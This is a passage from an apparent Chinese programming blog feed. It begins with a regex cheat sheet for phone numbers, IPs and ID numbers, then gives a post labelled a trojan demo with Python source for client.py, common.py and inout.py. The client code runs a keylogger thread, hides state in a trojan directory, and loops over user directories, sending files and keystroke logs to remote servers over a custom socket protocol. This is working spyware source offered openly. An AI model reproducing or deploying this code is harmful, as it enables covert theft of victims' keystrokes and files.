class="line"><span class="comment"> * 中国移动：China Mobile</span></span><br><span class="line"><span class="comment"> * 134,135,136,137,138,139,147,150,151,152,157,158,159,170,178,182,183,184,187,188</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">String CM = <span class="string">&quot;^1(3[4-9]|4[7]|5[0-27-9]|7[0]|7[8]|8[2-478])\\d&#123;8&#125;$&quot;</span>;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 中国联通：China Unicom</span></span><br><span class="line"><span class="comment"> * 130,131,132,145,152,155,156,1709,171,176,185,186</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">String CU = <span class="string">&quot;^1(3[0-2]|4[5]|5[56]|709|7[1]|7[6]|8[56])\\d&#123;8&#125;$&quot;</span>;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 中国电信：China Telecom</span></span><br><span class="line"><span class="comment"> * 133,134,153,1700,177,180,181,189</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">String CT = <span class="string">&quot;^1(3[34]|53|77|700|8[019])\\d&#123;8&#125;$&quot;</span>;</span><br></pre></td></tr></table></figure>
<h3 id="IP地址"><a href="#IP地址" class="headerlink" title="IP地址"></a>IP地址</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String IPREGEXP = <span class="string">&quot;((2[0-4]\d|25[0-5]|[01]?\d\d?)\.)&#123;3&#125;(2[0-4]\d|25[0-5]|[01]?\d\d?)&quot;</span>;</span><br></pre></td></tr></table></figure>
<h3 id="EMAIL地址"><a href="#EMAIL地址" class="headerlink" title="EMAIL地址"></a>EMAIL地址</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Email地址 = <span class="string">&quot;^\w+([-+.]\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)*$&quot;</span>;</span><br></pre></td></tr></table></figure>
<h3 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">域名 = <span class="string">&quot;[a-zA-Z0-9][-a-zA-Z0-9]&#123;0,62&#125;(/.[a-zA-Z0-9][-a-zA-Z0-9]&#123;0,62&#125;)+/.?&quot;</span>;</span><br><span class="line">InternetURL = <span class="string">&quot;[a-zA-z]+://[^\s]* 或 ^http://([\w-]+\.)+[\w-]+(/[\w-./?%&amp;=]*)?$&quot;</span></span><br></pre></td></tr></table></figure>
<h3 id="身份证"><a href="#身份证" class="headerlink" title="身份证"></a>身份证</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">身份证号(<span class="number">15</span>位、<span class="number">18</span>位数字) = <span class="string">&quot;^\d&#123;15&#125;|\d&#123;18&#125;$&quot;</span></span><br><span class="line">短身份证号码(数字、字母x结尾) = <span class="string">&quot;^([0-9])&#123;7,18&#125;(x|X)?$ 或 ^\d&#123;8,18&#125;|[0-9x]&#123;8,18&#125;|[0-9X]&#123;8,18&#125;?$&quot;</span></span><br></pre></td></tr></table></figure>
<h3 id="数字类校验"><a href="#数字类校验" class="headerlink" title="数字类校验"></a>数字类校验</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">数字 = <span class="string">&quot;^[0-9]*$&quot;</span>;</span><br><span class="line">n位的数字 = <span class="string">&quot;^\d&#123;n&#125;$&quot;</span>;</span><br><span class="line">至少n位的数字 = <span class="string">&quot;^\d&#123;n,&#125;$&quot;</span>;</span><br><span class="line">m-n位的数字 = <span class="string">&quot;^\d&#123;m,n&#125;$&quot;</span>;</span><br><span class="line">零和非零开头的数字 = <span class="string">&quot;^(0|[1-9][0-9]*)$&quot;</span>;</span><br><span class="line">非零开头的最多带两位小数的数字 = <span class="string">&quot;^([1-9][0-9]*)+(.[0-9]&#123;1,2&#125;)?$&quot;</span>;</span><br><span class="line">带<span class="number">1</span>-<span class="number">2</span>位小数的正数或负数 = <span class="string">&quot;^(\-)?\d+(\.\d&#123;1,2&#125;)?$&quot;</span>;</span><br><span class="line">正数、负数、和小数 = <span class="string">&quot;^(\-|\+)?\d+(\.\d+)?$&quot;</span>;</span><br><span class="line">有两位小数的正实数 = <span class="string">&quot;^[0-9]+(.[0-9]&#123;2&#125;)?$&quot;</span>;</span><br><span class="line">有<span class="number">1</span>~<span class="number">3</span>位小数的正实数 = <span class="string">&quot;^[0-9]+(.[0-9]&#123;1,3&#125;)?$&quot;</span>;</span><br><span class="line">非零的正整数 = <span class="string">&quot;^[1-9]\d*$ 或 ^([1-9][0-9]*)&#123;1,3&#125;$ 或 ^\+?[1-9][0-9]*$&quot;</span>;</span><br><span class="line">非零的负整数 = <span class="string">&quot;^\-[1-9][]0-9&quot;</span>*$<span class="string">&quot; 或 &quot;</span>^-[<span class="number">1</span>-<span class="number">9</span>]\d*$<span class="string">&quot;;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>yelog</category>
        <category>工具</category>
      </categories>
      <tags>
        <tag>regex</tag>
      </tags>
  </entry>
  <entry>
    <title>网络编程_demo</title>
    <url>//%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B_demo</url>
    <content><![CDATA[<h1 id="网络编程-木马-demo"><a href="#网络编程-木马-demo" class="headerlink" title="网络编程_木马__demo"></a>网络编程_木马__demo</h1><h2 id="client-py"><a href="#client-py" class="headerlink" title="client.py"></a>client.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> common <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> netapi <span class="keyword">import</span> NetAPI</span><br><span class="line"><span class="keyword">from</span> path <span class="keyword">import</span> scan_dir</span><br><span class="line"><span class="keyword">from</span> keylogger <span class="keyword">import</span> keylogger</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">socket_connect</span>(<span class="params">hostlist, port</span>):</span></span><br><span class="line">    lasthost = <span class="string">&#x27;localhost&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;hosts:&#x27;</span>, hostlist)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(hostlist, (<span class="built_in">list</span>, <span class="built_in">tuple</span>)):</span><br><span class="line">            hosts = [lasthost] + <span class="built_in">list</span>(hostlist)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            hosts = [lasthost, host]</span><br><span class="line">        <span class="keyword">for</span> host <span class="keyword">in</span> hosts:</span><br><span class="line">            <span class="comment"># print(&#x27;try to connect&#x27;, (host, port))</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">                s.connect((host, port,))</span><br><span class="line">                lasthost = host</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;connect %s:%s successfully&#x27;</span> % (host, <span class="built_in">str</span>(port)))</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="comment"># print(&#x27;Exceptions:&#x27;, e)</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">return</span> s</span><br><span class="line">        time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_dir</span>(<span class="params">addr, port, start_dir, visited=&#123;&#125;</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(start_dir, (<span class="built_in">list</span>, <span class="built_in">tuple</span>)):</span><br><span class="line">        <span class="keyword">for</span> d <span class="keyword">in</span> start_dir:</span><br><span class="line">            visited = send_dir(addr, port, d, visited)</span><br><span class="line">        <span class="keyword">return</span> visited</span><br><span class="line">    <span class="comment"># clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span></span><br><span class="line">    <span class="comment"># clientSocket.connect((addr, port, ))</span></span><br><span class="line">    clientSocket = socket_connect(addr, port)</span><br><span class="line">    logging.debug(<span class="string">&#x27;try to get banner&#x27;</span>)</span><br><span class="line">    banner = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> banner[-<span class="number">1</span>:] != <span class="string">b&#x27;\0&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(banner, clientSocket)</span><br><span class="line">        banner += clientSocket.recv(<span class="number">1024</span>)</span><br><span class="line">    logging.debug(<span class="string">&#x27;get banner done&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> banner[:<span class="number">4</span>] == <span class="string">b&#x27;7RJN&#x27;</span>:</span><br><span class="line">        logging.debug(<span class="string">&#x27;banner correct&#x27;</span>)</span><br><span class="line">        handler = NetAPI(clientSocket)</span><br><span class="line">        <span class="keyword">for</span> filename <span class="keyword">in</span> scan_dir(start_dir):</span><br><span class="line">            filesize = os.path.getsize(filename)</span><br><span class="line">            filemtime = os.path.getmtime(filename)</span><br><span class="line">            signature = [filesize, filemtime]</span><br><span class="line">            <span class="keyword">if</span> visited.get(filename) == signature:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            handler.send_file(filename)</span><br><span class="line">            visited[filename] = signature</span><br><span class="line">        handler.close()</span><br><span class="line">    clientSocket.shutdown(socket.SHUT_WR)</span><br><span class="line">    clientSocket.close()</span><br><span class="line">    <span class="keyword">return</span> visited</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_dir_update</span>(<span class="params">addr, port, start_dir, signature=<span class="literal">None</span></span>):</span></span><br><span class="line">    visited = &#123;&#125;</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(signature, <span class="built_in">str</span>) <span class="keyword">and</span> os.path.exists(signature):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(signature) <span class="keyword">as</span> fp:</span><br><span class="line">            visited = json.load(fp)</span><br><span class="line">    visited = send_dir(addr, port, start_dir, visited=visited)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(signature, <span class="built_in">str</span>):</span><br><span class="line">        dirname = os.path.dirname(signature)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(dirname):</span><br><span class="line">            os.makedirs(dirname)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(signature, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">            json.dump(visited, fp)</span><br><span class="line">    <span class="keyword">return</span> visited</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_file_thread</span>(<span class="params">addr, port, logs, signature=<span class="literal">None</span></span>):</span></span><br><span class="line">    last_send = <span class="number">0.0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        curtime = time.time()</span><br><span class="line">        <span class="keyword">if</span> curtime - last_send &lt; update_interval:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        last_send = curtime</span><br><span class="line">        args = (addr, port, start_dirs,)</span><br><span class="line">        kwargs = &#123;<span class="string">&#x27;signature&#x27;</span>: signature, &#125;</span><br><span class="line">        thread = threading.Thread(target=send_dir_update, args=args, kwargs=kwargs, )</span><br><span class="line">        thread.start()</span><br><span class="line">        threads.append(thread)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_log_thread</span>(<span class="params">addr, port, logs, signature=<span class="literal">None</span></span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        send_dir_update(addr, port, logs, signature=signature)</span><br><span class="line">        time.sleep(keylog_interval)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    threads = []</span><br><span class="line">    trojan_dir = trojan_dirs.get(platform.system(), [])</span><br><span class="line">    start_dirs = upload_dirs.get(platform.system(), [])</span><br><span class="line">    keylogdir = keylogger_dirs.get(platform.system())</span><br><span class="line">    signature = <span class="literal">None</span></span><br><span class="line">    keylogsignature = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(trojan_dir, <span class="built_in">str</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(trojan_dir):</span><br><span class="line">            os.makedirs(trojan_dir)</span><br><span class="line">        signature = os.path.join(trojan_dir, <span class="string">&#x27;Signature.json&#x27;</span>)</span><br><span class="line">        keylogsignature = os.path.join(trojan_dir, <span class="string">&#x27;KeyLogger.json&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> keylogdir:</span><br><span class="line">        thread = threading.Thread(target=keylogger, args=(keylogdir, <span class="literal">False</span>,))</span><br><span class="line">        thread.start()</span><br><span class="line">        threads.append(thread)</span><br><span class="line">        args = (SERVERS, PORT, keylogdir,)</span><br><span class="line">        kwargs = &#123;<span class="string">&#x27;signature&#x27;</span>: keylogsignature&#125;</span><br><span class="line">        thread = threading.Thread(target=send_log_thread, args=args, kwargs=kwargs)</span><br><span class="line">        thread.start()</span><br><span class="line">        threads.append(thread)</span><br><span class="line">    <span class="keyword">if</span> start_dirs:</span><br><span class="line">        args = (SERVERS, PORT, start_dirs,)</span><br><span class="line">        kwargs = &#123;<span class="string">&#x27;signature&#x27;</span>: signature&#125;</span><br><span class="line">        thread = threading.Thread(target=send_file_thread, args=args, kwargs=kwargs)</span><br><span class="line">        thread.start()</span><br><span class="line">        threads.append(thread)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">        thread.join()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="common-py"><a href="#common-py" class="headerlink" title="common.py"></a>common.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="comment"># logging.basicConfig(level=logging.DEBUG)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Output</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, mode=<span class="literal">True</span></span>):</span></span><br><span class="line">        self.silentMode = mode</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.silentMode:</span><br><span class="line">            <span class="built_in">print</span>(*args, **kwargs)</span><br><span class="line">            sys.stdout.flush()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set</span>(<span class="params">self, mode</span>):</span></span><br><span class="line">        self.silentMode = mode</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">thread_refresh</span>(<span class="params">threads, result=<span class="literal">None</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> result:</span><br><span class="line">        result = []</span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(result, (<span class="built_in">list</span>, <span class="built_in">tuple</span>)):</span><br><span class="line">        result = [result]</span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(thread, (<span class="built_in">list</span>, <span class="built_in">tuple</span>)):</span><br><span class="line">            result = thread_refresh(thread, result)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        thread.join(<span class="number">0.1</span>)</span><br><span class="line">        <span class="keyword">if</span> thread.is_alive():</span><br><span class="line">            result.append(thread)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="inout-py"><a href="#inout-py" class="headerlink" title="inout.py"></a>inout.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> common <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">InOutException</span>(<span class="params">Exception</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">INOUT</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, handle</span>):</span></span><br><span class="line">        self.handle    = handle</span><br><span class="line">        self.exceptTag = <span class="string">b&#x27;\\&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">data_to_nbyte</span>(<span class="params">self, n, exceptFlag=<span class="literal">False</span></span>):</span></span><br><span class="line">        exceptTag = &#123;<span class="literal">False</span>: <span class="string">b&#x27;&#x27;</span>, <span class="literal">True</span>:self.exceptTag&#125;.get(exceptFlag, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(n, <span class="built_in">int</span>):</span><br><span class="line">            <span class="keyword">if</span> n &lt; (<span class="number">1</span> &lt;&lt; <span class="number">8</span>):    tag  = <span class="string">&#x27;B&#x27;</span></span><br><span class="line">            <span class="keyword">elif</span> n &lt; (<span class="number">1</span> &lt;&lt; <span class="number">16</span>): tag  = <span class="string">&#x27;H&#x27;</span></span><br><span class="line">            <span class="keyword">elif</span> n &lt; (<span class="number">1</span> &lt;&lt; <span class="number">32</span>): tag  = <span class="string">&#x27;L&#x27;</span></span><br><span class="line">            <span class="keyword">elif</span> n &lt; (<span class="number">1</span> &lt;&lt; <span class="number">64</span>): tag  = <span class="string">&#x27;Q&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:               tag  = <span class="string">&#x27;U&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> tag != <span class="string">&#x27;U&#x27;</span>:</span><br><span class="line">                n     = struct.pack(<span class="string">&#x27;!&#x27;</span> + tag, n)</span><br><span class="line">                nbyte = tag.encode(<span class="string">&#x27;utf-8&#x27;</span>) + n</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                b     = bignum_to_bytes(n)</span><br><span class="line">                nbyte = tag.encode(<span class="string">&#x27;utf-8&#x27;</span>) + self.data_to_nbyte(<span class="built_in">len</span>(b)) + b</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">isinstance</span>(n, <span class="built_in">bytes</span>):</span><br><span class="line">            tag, b  = <span class="string">&#x27;s&#x27;</span>, n</span><br><span class="line">            nbyte = tag.encode(<span class="string">&#x27;utf-8&#x27;</span>) + self.data_to_nbyte(<span class="built_in">len</span>(b)) + b</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">isinstance</span>(n, <span class="built_in">str</span>):</span><br><span class="line">            tag, b  = <span class="string">&#x27;c&#x27;</span>, n.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            nbyte = tag.encode(<span class="string">&#x27;utf-8&#x27;</span>) + self.data_to_nbyte(<span class="built_in">len</span>(b)) + b</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">&#x27;data_to_nbyte: Invalid type: &#x27;</span> + <span class="built_in">type</span>(tag))</span><br><span class="line">        <span class="keyword">if</span> exceptFlag: logging.debug(<span class="string">&#x27;send exception: %s&#x27;</span>, nbyte)</span><br><span class="line">        <span class="keyword">return</span> exceptTag + nbyte</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">nbyte_to_data</span>(<span class="params">self</span>):</span></span><br><span class="line">        size_info  = &#123; <span class="string">&#x27;B&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;H&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;L&#x27;</span>:<span class="number">4</span>, <span class="string">&#x27;Q&#x27;</span>:<span class="number">8</span> &#125;</span><br><span class="line">        valendata  = &#123; <span class="string">&#x27;s&#x27;</span>: <span class="keyword">lambda</span> n: n,</span><br><span class="line">                       <span class="string">&#x27;c&#x27;</span>: <span class="keyword">lambda</span> n: n.decode(<span class="string">&#x27;utf-8&#x27;</span>),</span><br><span class="line">                       <span class="string">&#x27;U&#x27;</span>: <span class="keyword">lambda</span> n: bytes_to_bignum(n), &#125;</span><br><span class="line">        btag       = self.read_raw(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> btag:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        exceptFlag = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> btag == self.exceptTag:</span><br><span class="line">            exceptFlag = <span class="literal">True</span></span><br><span class="line">            btag       = self.read_raw(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> btag:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        tag          = btag.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> tag <span class="keyword">in</span> size_info:</span><br><span class="line">            size         = size_info[tag]</span><br><span class="line">            bnum         = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">while</span> <span class="built_in">len</span>(bnum) &lt; size:</span><br><span class="line">                bnum    += self.read_raw(size - <span class="built_in">len</span>(bnum))</span><br><span class="line">            result       = struct.unpack(<span class="string">&#x27;!&#x27;</span> + tag, bnum)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">elif</span> tag <span class="keyword">in</span> valendata:</span><br><span class="line">            size = self.nbyte_to_data()</span><br><span class="line">            <span class="keyword">if</span> size &gt;= <span class="number">65536</span>:</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">&#x27;length too long: &#x27;</span> + <span class="built_in">str</span>(size))</span><br><span class="line">            bstr         = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">while</span> <span class="built_in">len</span>(bstr) &lt; size:</span><br><span class="line">                bstr    += self.read_raw(size - <span class="built_in">len</span>(bstr))</span><br><span class="line">            <span class="comment"># result       = bstr if tag == &#x27;s&#x27; else bstr.decode(&#x27;utf-8&#x27;)</span></span><br><span class="line">            result       = valendata[tag](bstr)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">&#x27;nbyte_to_data: Invalid type: &#x27;</span> + tag)</span><br><span class="line">        <span class="keyword">if</span> exceptFlag:</span><br><span class="line">            logging.debug(<span class="string">&#x27;recv exception: %s&#x27;</span>, result)</span><br><span class="line">            <span class="keyword">raise</span> InOutException(result)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">self</span>):</span></span><br><span class="line">        d = self.nbyte_to_data()</span><br><span class="line">        <span class="keyword">return</span> d</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">self, d, exceptFlag=<span class="literal">False</span></span>):</span></span><br><span class="line">        byte_data = self.data_to_nbyte(d, exceptFlag)</span><br><span class="line">        self.write_raw(byte_data)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read_raw</span>(<span class="params">self, n</span>):</span></span><br><span class="line">        d = self.read_handle(n)</span><br><span class="line">        <span class="keyword">return</span> d</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">write_raw</span>(<span class="params">self, d</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.write_handle(d)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">close</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.close_handle()</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read_handle</span>(<span class="params">self, n</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">write_handle</span>(<span class="params">self, d</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(d)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">close_handle</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.handle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NetworkIO</span>(<span class="params">INOUT</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read_handle</span>(<span class="params">self, n</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> self.handle.recv(n)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            logging.debug(<span class="string">&#x27;Exception: %s&#x27;</span>, <span class="built_in">str</span>(e))</span><br><span class="line">            <span class="keyword">raise</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">write_handle</span>(<span class="params">self, d</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> self.handle.send(d)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            logging.debug(<span class="string">&#x27;Exception: %s&#x27;</span>, <span class="built_in">str</span>(e))</span><br><span class="line">            <span class="keyword">raise</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">close_handle</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileIO</span>(<span class="params">INOUT</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read_handle</span>(<span class="params">self, n</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.handle.read(n)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">write_handle</span>(<span class="params">self, d</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.handle.write(d)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StringIO</span>(<span class="params">INOUT</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read_handle</span>(<span class="params">self, n</span>):</span></span><br><span class="line">        data, self.handle = self.handle[:n], self.handle[n:]</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">write_handle</span>(<span class="params">self, d</span>):</span></span><br><span class="line">        self.handle += d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">InitIO</span>(<span class="params">handle</span>):</span></span><br><span class="line">    readers = &#123;</span><br><span class="line">        <span class="built_in">bytes</span>:         StringIO,</span><br><span class="line">        io.IOBase:     FileIO,</span><br><span class="line">        socket.socket: NetworkIO,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> readers.get(<span class="built_in">type</span>(handle), <span class="keyword">lambda</span> n: <span class="literal">None</span>)(handle)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bignum_to_bytes</span>(<span class="params">n</span>):</span></span><br><span class="line">    result = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">        b = n % <span class="number">128</span></span><br><span class="line">        n &gt;&gt;= <span class="number">7</span></span><br><span class="line">        <span class="keyword">if</span> n:</span><br><span class="line">            b += <span class="number">128</span></span><br><span class="line">        result += <span class="built_in">bytes</span>([b])</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bytes_to_bignum</span>(<span class="params">bs</span>):</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    exp    = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> bs:</span><br><span class="line">        n = b % <span class="number">128</span></span><br><span class="line">        result += n &lt;&lt; exp</span><br><span class="line">        exp += <span class="number">7</span></span><br><span class="line">        <span class="keyword">if</span> b &amp; (<span class="number">1</span> &lt;&lt; <span class="number">7</span>) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

